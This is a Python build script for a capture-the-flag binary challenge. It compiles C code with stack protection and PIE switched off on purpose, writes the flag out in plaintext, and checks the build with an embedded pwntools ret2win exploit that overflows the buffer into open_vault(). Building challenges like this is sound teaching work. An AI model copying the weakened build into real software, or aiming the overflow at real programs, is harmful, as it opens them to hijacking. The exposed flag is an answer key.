#!/usr/bin/env python3
"""
CAT THE WRONG FLAG - build script  (REAL challenge, flag = ZeroSecure{...}).

Inside the ctfbuild container:
  1. fill the XOR-encrypted flag array into the source and compile
     (no canary, no PIE) -> dist/challenge
  2. ship the container's libc.so.6 + ld (for consistent local running)
  3. self-verify:
       * `strings` is clean (flag not present in plaintext)
       * a normal run does NOT print the flag
       * overflowing vuln() into open_vault() DOES print the flag
"""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
WIN_PATH = HERE.replace("/c/", "C:\\").replace("/", "\\")

FLAG = "ZeroSecure{c0ntr0l_fl0w_0p3ns_th3_v4ult}"


def gen_source():
    enc = bytes((c ^ 0x5A) for c in FLAG.encode())
    arr = ", ".join(str(b) for b in enc)
    src = open(os.path.join(HERE, "src", "challenge.c")).read()
    src = src.replace("{ VAULT_BYTES }", "{ " + arr + " }")
    src = src.replace("VAULT_LEN", str(len(enc)))
    with open(os.path.join(HERE, "src", "_generated.c"), "w", newline="\n") as f:
        f.write(src)


SCRIPT = r'''
set -e
cd /work
mkdir -p dist
gcc -fno-stack-protector -no-pie -O0 -w -o dist/challenge src/_generated.c
chmod 755 dist/challenge
cp /lib/x86_64-linux-gnu/libc.so.6 dist/libc.so.6
cp /lib64/ld-linux-x86-64.so.2 dist/ld-linux-x86-64.so.2
echo "=== file ==="
file dist/challenge
echo "=== strings clean? (expect: clean) ==="
strings dist/challenge | grep -q "ZeroSecure" && echo LEAK || echo clean
echo "=== normal run must NOT print the flag ==="
echo "readme.txt" | ./dist/challenge
echo "=== exploit test ==="
export TERM=xterm PWNLIB_NOTERM=1
python3 - <<'PY'
from pwn import *
context.update(arch="amd64", log_level="error")
e = ELF("/work/dist/challenge", checksec=False)
ret = ROP(e).find_gadget(["ret"])[0]

def fire(off, align):
    p = e.process()
    p.recvuntil(b"fetch it:")
    chain = ([ret] if align else []) + [e.sym["open_vault"]]
    p.sendline(flat({off: chain}))
    data = p.recvall(timeout=3)
    p.close()
    return data

flag = None
for off in (72, 64, 80, 88):
    for align in (True, False):
        out = fire(off, align)
        if b"ZeroSecure{" in out:
            flag = out
            print("offset =", off, "| align ret =", align)
            break
    if flag:
        break
assert flag, "could not reach open_vault()"
import re
print("recovered:", re.search(rb"ZeroSecure\{[^}]*\}", flag).group().decode())
print("ALL PWN PATHS OK")
PY
'''


def main():
    gen_source()
    env = dict(os.environ, MSYS_NO_PATHCONV="1")
    r = subprocess.run(
        ["docker", "run", "--rm", "-v", f"{WIN_PATH}:/work", "ctfbuild",
         "bash", "-c", SCRIPT],
        capture_output=True, text=True, env=env,
    )
    print(r.stdout)
    if r.returncode != 0 or "ALL PWN PATHS OK" not in r.stdout:
        print(r.stderr, file=sys.stderr)
        sys.exit("build/exploit test failed")
    if "clean" not in r.stdout or "LEAK" in r.stdout:
        sys.exit("flag leaked in plaintext!")
    print("[08 CAT THE WRONG FLAG] build OK  (flag =", FLAG + ")")


if __name__ == "__main__":
    main()
